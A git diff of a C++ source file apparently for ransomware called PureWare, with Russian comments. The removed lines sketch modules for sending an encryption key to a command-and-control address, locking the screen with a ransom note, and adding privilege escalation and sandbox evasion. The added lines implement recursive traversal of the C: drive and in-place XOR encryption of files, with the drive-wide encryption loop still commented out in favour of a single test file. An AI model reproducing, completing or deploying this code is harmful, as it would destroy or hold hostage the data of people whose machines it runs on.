@@ -1,82 +1,179 @@
 ﻿#include "PureWare.hpp"
-
-using namespace std;;
+ 
 using path_t = std::filesystem::path;
+using namespace std;
+auto file_logger = spdlog::basic_logger_mt("file_logger", "logs/my_log.txt");
 
+void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCript) {
+    try {
+        if (filesystem::exists(path) && filesystem::is_directory(path)) {
+            bool isEmpty = true;
+            for (const auto& entry : filesystem::directory_iterator(path)) {
+                auto filePath = entry.path();
+                // Skip specific directories
+                if (filePath == "C:/Documents and Settings" || filePath == "C:/System Volume Information") {
+                    continue;
+                }
 
-// Нам надо этот файлик разделить на несколько, чтоб норм структура была и чтобы не париться потом с гитом и тд
+                if (entry.is_directory()) {
+                    // Recursive call to traverse subdirectories
+                    traverseDirectory(filePath, pathToCript);
+                    isEmpty = false;
+                }
+                else if (entry.is_regular_file()) {
+                    // Add file to the vector
+                    pathToCript.emplace_back(filePath);
+                    isEmpty = false;
+                }
+            }
 
-using namespace std; // норм пока разработка 
+            if (!isEmpty) {
+                // Add non-empty directory to the vector
+                pathToCript.emplace_back(path);
+            }
+        }
+    }
+    catch (const filesystem::filesystem_error& e) {
+        file_logger->error("Filesystem error : {}",e.what());
+    }
+    catch (const std::exception& e) {
+        file_logger->error("Standard exception:  {}", e.what());
+    }
+    catch (...) {
+        file_logger->error("Unknown error occurred last:  {}", GetLastError());
+    }
+}
 
-// All about files
-class FileModule
-{
-private:
-    int KillActiveFile() const; // Чекает используется ли файл и убивает процесс, который его юзает
-    int DirectoryCheck() const; // Если директорию не нужно шифровать, возвращает  0
-
-    path_t directory; // Директория, которую вернёт метод FindDirectory
-    size_t fileOrder; // Здесь хранится номер файла который сейчас вернёт GetNextFile или типа того
-
-public:
-    FileModule();  // объявляем конструктор 
-    void FindDirectory(); // Ищет наименьшую директорию, на которую у нас есть права "C:\Users\{Username}\" и записывает в атрибут directory
-    path_t GetNextFile() const; // возвращает следующий файл, который необходимо зашифровать либо Null если закончились
-};
-
-// All about cipher
-class CipherModule
-{
-public:
-    std::string key;
-    CipherModule(std::string key); // объявляем конструктор передавая ключ которым надо всё шифровать, он запишет его в атрибут key
-    int Cipher(path_t file) const; // Передаём файл который надо зашифровать, возращает 0 если всё ок
-};
-
-// Generate cipher key and send it to the specified C2
-class KeyModule
-{
-public:
-    std::string key;
-    KeyModule(std::string C2Address); // Передаём хост который получит ключ
-    void KeyGen(); // Запишет в атрибут key сгенеренный ключ
-    int SendKey() const; // Отправит ключ на сервак указанный при создании шаблона класса
-};
-
-// Block everything and create a desktop shity note // Надо дописать так, чтобы можно было кастомить
-class NoteModule
-{
-public:
-    NoteModule();
-    void MakeSomeShit(); // Блокает к херам всё и выводит надпись
-};
-
-// Escalate our privileges to local admin if not already
-// class PrivEscModule { # ToDo # };
-
-// Check if we are in a sandbox and if true > do nothing  
-// class SandboxEvasionModule { # ToDo # };
-
-int main(void)
-{
-    setlocale(LC_ALL, "Russian");
-    FileModule fileModule;
-    fileModule.FindDirectory();
-
-
-    KeyModule key(C2_IP_ADDRESS);
-    key.KeyGen();
-
-    CipherModule PureWare(key.key);
-    NoteModule note;
-
-    // Нужно подумать как это дерьмо оптимизировать, кажется сейчас оно будет шифровать супер медленно
-    for (; !endProgramExecution;) {
-        PureWare.Cipher(fileModule.GetNextFile());
+void encryptFile(const std::filesystem::path& path, const std::string& key) {
+    // Проверка существования файла и доступности для чтения
+    if (!std::filesystem::exists(path) || !std::filesystem::is_regular_file(path)) {
+        file_logger->critical("Файл не найден или это не файл: {}", path.string());
+        return;
     }
 
-    note.MakeSomeShit();
+    // Открытие файла для чтения в бинарном режиме
+    std::ifstream file(path, std::ios::binary);
+    if (!file.is_open()) {
+        file_logger->critical("Не удалось открыть файл для чтения: {}", path.string());
+        return;
+    }
 
+    // Чтение содержимого файла
+    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+    file.close();
+
+    // XOR шифрование
+    for (size_t i = 0; i < buffer.size(); ++i) {
+        buffer[i] ^= key[i % key.length()];
+    }
+
+    // Запись зашифрованных данных обратно в файл
+    std::ofstream outfile(path, std::ios::binary);
+    if (!outfile.is_open()) {
+        file_logger->critical("Не удалось открыть файл для записи : {}", path.string());
+        return;
+    }
+
+    outfile.write(buffer.data(), buffer.size());
+    outfile.close();
+}
+
+void decryptFile(const path_t& filePath, const std::string& key) {
+    // Open the file for reading in binary mode
+    std::ifstream fileIn(filePath, std::ios::binary);
+    if (!fileIn) {
+        file_logger->critical("Cannot open file: {}", filePath.string());
+        return;
+    }
+    // Read the file content
+    std::string fileContent((std::istreambuf_iterator<char>(fileIn)), std::istreambuf_iterator<char>());
+    fileIn.close();
+
+    // Perform XOR decryption (same as encryption)
+    for (size_t i = 0; i < fileContent.size(); ++i) {
+        fileContent[i] ^= key[i % key.size()];
+    }
+
+    // Write the decrypted content back to the file
+    std::ofstream fileOut(filePath, std::ios::binary);
+    if (!fileOut) {
+        file_logger->critical("Cannot open file: {}", filePath.string());
+        return;
+    }
+
+    fileOut.write(fileContent.data(), fileContent.size());
+    fileOut.close();
+}
+
+int main(int argc, char* argv[])
+{
+    setlocale(LC_ALL, "Russian");
+    path_t pathFolder = "C:/";
+    vector<path_t> PathToCript;
+
+    file_logger->set_level(spdlog::level::info);
+    file_logger->info("start the Cript");
+
+    path_t startPath = "C:/";
+    std::vector<path_t> pathToCript;
+    //traverseDirectory(startPath, pathToCript);
+    /*try {
+        if (filesystem::exists(pathFolder) && filesystem::is_directory(pathFolder)) {
+            for (const auto& entry : filesystem::directory_iterator(pathFolder)) {
+                auto filePath = entry.path();
+                if (entry.is_directory()) {
+                    // Ignore certain directories
+                    if (filePath == "C:/Documents and Settings" || filePath == "C:/System Volume Information") continue;
+
+                    // Check if directory is empty
+                    if (filesystem::is_empty(filePath)) {
+                        std::cout << "Directory is empty" << std::endl;
+                    }
+                    else {
+                        PathToCript.emplace_back(filePath);
+                        std::cout << "Directory is not empty" << std::endl;
+                    }
+                }
+                else if (entry.is_regular_file()) {
+                    // If it's a file, add it to the vector
+                    PathToCript.emplace_back(filePath);
+                    std::cout << "File added: " << filePath << std::endl;
+                }
+            }
+        }
+    }
+    catch (const filesystem::filesystem_error& e) {
+        std::cerr << "Filesystem error: " << e.what() << std::endl;
+        file_logger->error("Eror is {}", e.what());
+        file_logger->error(GetLastError());
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Standard exception: " << e.what() << std::endl;
+        file_logger->error("Eror is {}", e.what());
+        file_logger->error(GetLastError());
+    }
+    catch (...) {
+        file_logger->error("Unknown error occurred");
+        std::cerr << "Unknown error occurred" << std::endl;
+        file_logger->error(GetLastError());
+    }*/
+
+    path_t a = "C:/Users/zero/Desktop/1.txt";
+    encryptFile(a, "12");
+    file_logger->info("ok");
+    //decryptFile(a, "12");
+    /*string key{ 12 };
+    for (const auto& a : pathToCript) {
+        file_logger->info("path {}", a.string());
+        if (std::filesystem::is_regular_file(a)) {
+            encryptFile(a, key);
+        }
+    }*/
+
+    // повышение до adm
+    // сбор данных для шифрования
+    // шифрование
+    // дешифрование 
     return 0;
 }
 
